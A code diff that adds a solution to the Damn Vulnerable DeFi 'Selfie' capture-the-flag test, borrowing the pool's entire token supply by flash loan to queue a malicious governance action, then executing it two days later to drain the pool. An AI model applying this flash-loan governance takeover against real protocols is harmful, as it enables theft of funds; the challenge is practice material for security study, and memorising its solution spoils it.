@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {SelfieFlashLoanReceiver} from "../../src/selfie/SelfieFlashLoanReceiver.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,6 +63,17 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
+        // Deploy the SelfieFlashLoanReceiver contract
+        SelfieFlashLoanReceiver receiver = new SelfieFlashLoanReceiver(governance, pool, recovery);
+
+        // Initiate a flash loan, where we propse the malicous action to be executed
+        pool.flashLoan(receiver, address(token), TOKENS_IN_POOL, "");
+
+        // Skip 2 days into the future
+        skip(2 days);
+
+        // Execute the action in the governance contract
+        governance.executeAction(1);
         
     }
 
